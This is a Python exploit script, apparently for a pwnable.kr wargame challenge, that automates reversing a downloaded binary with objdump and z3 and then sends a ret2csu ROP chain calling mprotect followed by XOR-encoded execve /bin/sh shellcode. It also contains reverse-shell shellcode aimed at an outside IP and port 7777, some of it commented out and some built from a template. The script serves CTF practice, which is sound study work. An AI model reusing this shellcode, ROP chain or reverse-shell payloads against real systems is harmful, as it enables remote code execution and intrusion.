from zio import *
from pwn import *

import base64
import zipfile
from StringIO import StringIO
import subprocess
import re

context(arch = "amd64", os = 'linux')

def run_cmd(cmd, out_file = "out.txt", shell = True):
	fdout = open(out_file, 'w') 
	#p = subprocess.Popen(cmd, stdin = subprocess.PIPE, stdout = subprocess.PIPE, stderr = subprocess.PIPE, shell = shell)
	p = subprocess.Popen(cmd, stdin = fdout, stdout = fdout, stderr = fdout, shell = shell)
	p.wait()
	
	fdout.close()
	file_r = open(out_file, "r")
	data = file_r.read()
	file_r.close()
	return data

target = ("pwnable.kr", 9005)
def get_io(target):
	io = zio(target, timeout = 9999, print_read = COLORED(RAW, "green"), print_write = COLORED(RAW, "blue"))
	return io

def get_data(io, fromfile = False):
	data = ""
	if fromfile == False:
		io.read_until("wait...\n")
		data = io.read_until("\n").strip()
		data = base64.decodestring(data)
	else:
		file_r = open("binary1.bin")
		data = file_r.read()
		file_r.close()
	return data

def get_value_from(info, begin_str, end_str, offset = 0):
	begin_pos = info.find(begin_str)
	if begin_pos == -1:
		return "" 
	
	begin_pos += len(begin_str)

	end_pos = info.find(end_str, begin_pos)
	if  end_pos == -1:
		return ""
	return info[begin_pos:end_pos], begin_pos + offset, end_pos + offset

def replace_info(info, map_info):
	for key in map_info.keys():
		info = info.replace(key, map_info[key])
	return info

func_map = {}
def init_deal_func():
	global func_map
	func_map["mov"] = lambda x,y:"%s = %s"%(y, x)
	func_map["shl"] = lambda x,y:"%s <<= %s"%(y, x)
	func_map["add"] = lambda x,y:"%s += %s"%(y, x)
	func_map["sub"] = lambda x,y:"%s -= %s"%(y, x)
	func_map["imu"] = lambda x,y:"%s *= %s"%(y, x)
	func_map["cmp"] = lambda x,y:"%s == %s"%(y, x)
	func_map["lea"] = lambda x,y:"%s = %s"%(y, x)
init_deal_func()

def parse_opcode(info):
	info = info.replace("(,", "(")
	info = info.replace(",)", ")")
	pos_b = info.find("(")
	while pos_b != -1:
		pos2 = info[:pos_b].rfind(",")
		if pos2 == -1:
			pos2 = info[:pos_b].rfind(" ")

		pos_b = pos2 + 1


		pos_e = info.find(")")
		#print "here", info
		if pos_e == -1:
			print "error"
			exit(0)
		all_in_one = info[pos_b:pos_e + 1]

		pos = all_in_one.rfind(",")

		if pos != -1 and all_in_one[pos + 1:-1].isdigit():
			all_in_one = all_in_one[:pos] + "*" + all_in_one[pos + 1:]

		all_in_one = all_in_one.replace(",", "+")
		#print "all_in_one:", all_in_one
		if all_in_one.startswith("("):
			all_in_one = all_in_one.replace("(", "")
		else:
			all_in_one = all_in_one.replace("(", "+")

		if all_in_one.endswith(")"):
			all_in_one = all_in_one.replace(")", "")
		else:
			all_in_one = all_in_one.replace(")", "+")

		info = info.replace(info[pos_b:pos_e + 1], all_in_one)

		pos_b = info.find("(")
	return info

def parse_asm(info):
	global func_map
	codes = info.split(" ")
	op = codes[0][:3]
	opcode = codes[-1]
	#print "--op", op
	if op in func_map.keys():
		opcode = parse_opcode(opcode)
		opcodes = opcode.split(",")
		#print "--parse", func_map[op](opcodes[0], opcodes[1])
		return func_map[op](opcodes[0], opcodes[1])
	else:
		print "error"
		print info
		exit(0)
		return info

def deal_temp_val(info):
	index = 0
	pos = info.find("rbp")
	while pos != -1:
		pos_b = info.find("-", pos-15)
		if pos_b == -1:
			print "error"
			return info
		pos_e = info.find(")", pos)
		if pos_e == -1:
			print "error"
			return info

		temp_val = info[pos_b:pos_e + 1]

		info = info.replace(temp_val, "tmp%d"%index)
		index += 1
		pos = info.find("rbp")
	return info

def generate_pyfile(code_list, file_name = "z3_solver.py"):
	args_map = ['a1', 'a2', 'a3']
	for item in code_list:
		arg = item.split(" ")[0]
		if arg not in args_map:
			args_map.append(arg)

	file_w = open(file_name, 'w')
	file_w.write("from z3 import *\n")

	for arg in args_map:
		#print arg
		file_w.write(arg + " = " + "BitVec('%s', 8)\n"%arg)

	file_w.write("s = Solver()\n")
	for item in code_list:
		if item.split(" ")[1] == "==":
			file_w.write("s.add(%s)\n"%item)
		else:
			file_w.write(item + "\n")

	file_w.write("print s.check()\n")
	file_w.write("print s.model()[a1], s.model()[a2], s.model()[a3]")
	file_w.close()


def get_info(data):
	#mov    $0x9290a06,%rdi
	pattern = "mov    \$0x[0-9a-f]+,%rdi"
	g = re.search(pattern, data)
	print g.start(), g.end()
	#print data[g.start():g.end()]
	main_addr = data[g.start() + 10:g.end() - 5]
	print "main_addr:", main_addr

	main_pos = data.find(main_addr + ":")
	cmp_addr = data[main_pos:].find("and    $0x1,%eax") + main_pos
	print "cmp_addr:", cmp_addr

	global_buff_addr, start_pos, end_pos = get_value_from(data[cmp_addr:], "movzbl ", "(", cmp_addr)
	print "global_buff_addr:", global_buff_addr, start_pos, end_pos


	opcode1, start_pos, end_pos = get_value_from(data[cmp_addr:], "xor    $", ",%edx", cmp_addr)
	print opcode1, start_pos, end_pos 
	opcode2, start_pos, end_pos = get_value_from(data[end_pos:], "xor    $", ",%edx", end_pos)
	print opcode2, start_pos, end_pos 

	global_buff_addr = int(global_buff_addr, 16)
	opcode1 = int(opcode1, 16)
	opcode2 = int(opcode2, 16)

	call_puts, start_pos, end_pos = get_value_from(data[end_pos:], "callq  ", " ", end_pos)
	func_name, start_pos, end_pos = get_value_from(data[end_pos:], "callq  ", " ", end_pos)

	print func_name
	i = 0
	key_check = []
	while i < 16:
		end_pos = func_addr = data.find(func_name + ":")
		cmp_addr = data.find("cmp", end_pos)
		cmp1_addr = cmp_addr
		print "cmp_addr:",cmp_addr
		#print data
		a1, start_pos, end_pos = get_value_from(data[cmp_addr:], "$", ",", cmp_addr)
		print "   a1:", a1
		cmp_addr = data.find("cmp", end_pos)
		cmp2_addr = data.find("\n", cmp_addr)

		a2, start_pos, end_pos = get_value_from(data[cmp_addr:], "$", ",", cmp_addr)
		print "   a2:", a2
		cmp_addr = data.find("cmp", end_pos)
		cmp3_addr = data.find("\n", cmp_addr)
		a3, start_pos, end_pos = get_value_from(data[cmp_addr:], "$", ",", cmp_addr)
		print "   a3:", a3

		func_name, start_pos, end_pos = get_value_from(data[func_addr:], "callq  ", " ", func_addr)
		print "   func_name:", func_name


		code = data[cmp1_addr:cmp3_addr]

		is_show = False

		if is_show:
			print "code:"
			print code
		#code = code.replace("-0x4(%rbp)", "a1")
		#code = code.replace("-0x8(%rbp)", "a2")
		#code = code.replace("-0xc(%rbp)", "a3")
		map_info = {"-0x4(%rbp)":"a1",
					"-0x8(%rbp)":"a2",
					"-0xc(%rbp)":"a3",
					"-0x14(%rbp)":"a1",
					"-0x18(%rbp)":"a2",
					"-0x1c(%rbp)":"a3",
					"al":"eax",
					"dl":"edx",
					"bl":"ebx",
					"cl":"ecx",
					"rax":"eax",
					"rdx":"edx",
					"rbx":"ebx",
					"rcx":"ecx",
					"$":""}

		code = replace_info(code, map_info)

		code = code.replace("%", "")

		code = deal_temp_val(code)


		code = code.split("\n")

		code_result = []
		for item in code:
			item = item.split("\t")[-1]
			if item.startswith("jne"):
				continue
			#if item.startswith("lea"):
				#continue
			code_result.append(parse_asm(item))

		if is_show:
			print "code:"
			for item in code_result:
				print item

		generate_pyfile(code_result, "z3_solver.py")
		result = run_cmd("python z3_solver.py", "z3_solver_result.txt")
		#print "result:", result

		key_check.append(result.split("\n")[1])
		i += 1
	#print key_check
	key_check = " ".join(key_check)

	end_pos = func_addr = data.find(func_name + ":")
	size, start_pos, end_pos = get_value_from(data[end_pos:], "lea    -", "(%rbp)", end_pos)
	size = int(size, 16)
	#get set_args_addr and call_func_addr
	main_leave_addr = data[main_pos:].find("leaveq") + main_pos
	print "main_leave_addr:", main_leave_addr
	set_args_addr_pos = data[main_leave_addr:].find("mov    0x8(%rsp),%rbx") + main_leave_addr
	set_args_addr_pos = data[main_leave_addr:set_args_addr_pos].rfind("\n") + 1  + main_leave_addr
	set_args_addr_pos_e = data[set_args_addr_pos:].find(":") + set_args_addr_pos

	#print set_args_addr_pos, set_args_addr_pos_e
	set_args_addr = data[set_args_addr_pos:set_args_addr_pos_e]
	print "set_args_addr:", set_args_addr
	set_args_addr = int(set_args_addr, 16)

	call_func_addr_pos = data[main_leave_addr:].find("mov    %r15,%rdx") + main_leave_addr
	call_func_addr_pos = data[main_leave_addr:call_func_addr_pos].rfind("\n") + 1  + main_leave_addr
	call_func_addr_pos_e = data[call_func_addr_pos:].find(":") + call_func_addr_pos

	#print call_func_addr_pos, call_func_addr_pos_e
	call_func_addr = data[call_func_addr_pos:call_func_addr_pos_e]
	print "call_func_addr:", call_func_addr
	call_func_addr = int(call_func_addr, 16)

	print "main_leave_addr:", main_leave_addr

	return key_check, size, opcode1, opcode2, global_buff_addr, set_args_addr, call_func_addr

def get_got_table(data):
	pos = data.find("OFFSET           TYPE              VALUE")
	pos += len("OFFSET           TYPE              VALUE")
	data = data[pos:].strip()

	#print data
	got_table = {}
	tables = data.split("\n")
	for item in tables:
		items = item.split(" ")
		got_table[items[-1]] = items[0]
	return got_table

def pwn(io, fromfile = False):
	
	if fromfile == False:

		run_cmd("rm binary*")
		data = get_data(io, fromfile)
		#buf = StringIO(data)
		#f = zipfile.ZipFile(file = buf)
		#data = f.read()
		file_w = open("binary1.z", "w")
		file_w.write(data)
		file_w.close()

		run_cmd("uncompress binary1.z")
		io.read_until("remember you only have 10 seconds... hurry up!\n")

	data = run_cmd("objdump -d binary1")
	print "-------------------disassemble-------------------"
	#print data
	print "-------------------disassemble-------------------"
	key_check, size, opcode1, opcode2, global_buff_addr, set_args_addr, call_func_addr = get_info(data)
	#print key_check
	print "global_buff_addr:", hex(global_buff_addr)

	key_check = key_check.split(" ")
	#print "".join(["%02x"%(int(c)) for c in key_check])
	for index, c in enumerate(key_check):
		if index & 1 == 1:
			key_check[index] = "%02x"%((int(c) ^ opcode2)&0xff)
		else:
			key_check[index] = "%02x"%((int(c) ^ opcode1)&0xff)

	print "size:", size
	payload = "".join(key_check)

	rbp = l64(0x10101010101010101010)
	ret = l64(0x10101010101010101010)

	shellcode =  'a' * size + rbp

	#get got table
	got_info = run_cmd("objdump -R binary1")
	got_table = get_got_table(got_info)

	print got_table

	mprotect_got = l64(int(got_table["mprotect"], 16))

	set_args_addr = l64(set_args_addr)
	#+ 0 no use 
	#+ 8 rbx 0
	#+10 rbp 1 ;rbx + 1 = rbp (will call set_args_addr again)
	#+18 r12 func_addr(got)
	#+20 r14 arg1
	#+28 r13 arg2
	#+30 r15 arg3
	call_func_addr = l64(call_func_addr)
	page_size = l64(2 * 4096)
	PROT_READ = 1
	PROT_WRITE = 2
	PROT_EXEC = 4
	prot_mode = l64(PROT_READ | PROT_WRITE | PROT_EXEC)

	shellcode_addr_got = l64(global_buff_addr + 48 + len(shellcode) + (9 * 2 - 1) * 8)

	shellcode_addr = global_buff_addr + 48 + len(shellcode) + (9 * 2) * 8
	shellcode_addr_page = l64(shellcode_addr & 0xffffffffffffff000)

	shellcode_addr = l64(shellcode_addr)

	shellcode += set_args_addr
	shellcode += l64(0x0) #no use
	shellcode += l64(0)	  #rbx 0
	shellcode += l64(1)	  #rbp 1
	shellcode += mprotect_got #func_addr
	shellcode += shellcode_addr_page #arg1 addr
	shellcode += page_size 	 		 #arg2 size
	shellcode += prot_mode 			 #arg3 pro
	shellcode += call_func_addr

	shellcode += l64(0x0) #no use
	shellcode += l64(0)	  #rbx 0
	shellcode += l64(1)	  #rbp 1
	shellcode += shellcode_addr_got #shellcode addr
	shellcode += shellcode_addr_got #arg1 no use
	shellcode += shellcode_addr_got #arg2 no use
	shellcode += shellcode_addr_got #arg3 no use
	shellcode += call_func_addr

	#shellcode_addr_got  save the value of shellcode_addr
	shellcode += shellcode_addr
	
	#jmp_esp_code = asm("jmp rsp")
	#shellcode += jmp_esp_code

	"""
	#/bin/ls > /tmp/ls.result
	shellcode += "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68"
	shellcode += "\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6"
	shellcode += "\x52\xe8\x19\x00\x00\x00\x2f\x62\x69\x6e\x2f\x6c\x73"
	shellcode += "\x20\x3e\x20\x2f\x74\x6d\x70\x2f\x6c\x73\x2e\x72\x65"
	shellcode += "\x73\x75\x6c\x74\x00\x56\x57\x48\x89\xe6\x0f\x05"
	"""

	#system shell
	shellcode += "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68"
	shellcode += "\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6"
	shellcode += "\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68"
	shellcode += "\x00\x56\x57\x48\x89\xe6\x0f\x05"


	"""
	#remote 199.188.74.220, 7777
	shellcode += "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
	shellcode += "\x97\x48\xb9\x02\x00\x1e\x61\xc7\xbc\x4a\xdc\x51\x48"
	shellcode += "\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
	shellcode += "\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"
	shellcode += "\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"
	shellcode += "\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"
	"""

	"""
	#local 127.0.0.1, 7777
	shellcode += "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
	shellcode += "\x97\x48\xb9\x02\x00\x1e\x61\x7f\x00\x00\x01\x51\x48"
	shellcode += "\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
	shellcode += "\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"
	shellcode += "\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"
	shellcode += "\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"
	"""

	ip = "127.0.0.1"
	ip = "192.168.174.134"
	port = 7777
	ip_data = "".join([l8(int(c)) for c in ip.split('.')])
	port_data = l16(port)[::-1]

	shellcode_model = ""
	shellcode_model += "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
	shellcode_model += "\x97\x48\xb9\x02\x00" + port_data + ip_data + "\x51\x48"
	shellcode_model += "\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
	shellcode_model += "\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"
	shellcode_model += "\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"
	shellcode_model += "\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

	#shellcode += shellcode_model

	shellcode_list = []
	for index, c in enumerate(shellcode):
		if index & 1 == 1:
			shellcode_list.append("%02x"%((ord(c) ^ opcode2)&0xff))
		else:
			shellcode_list.append("%02x"%((ord(c) ^ opcode1)&0xff))
	shellcode = "".join(shellcode_list)

	payload += shellcode + "00"
	print payload
	if fromfile == True:
		file_w = open("exp.dat", 'w')
		file_w.write(payload + "\n")
		file_w.close
	else:
		io.write(payload + "\n")
		io.interact()



#data = run_cmd("objdump -d -M x86-64 binary1_3\n")
#print get_info(data)
#exit(0)
"""
#local
target = "./binary1"
io = get_io(target)
pwn(io, fromfile = True)

"""
#remote
io = get_io(target)
pwn(io, fromfile = False)
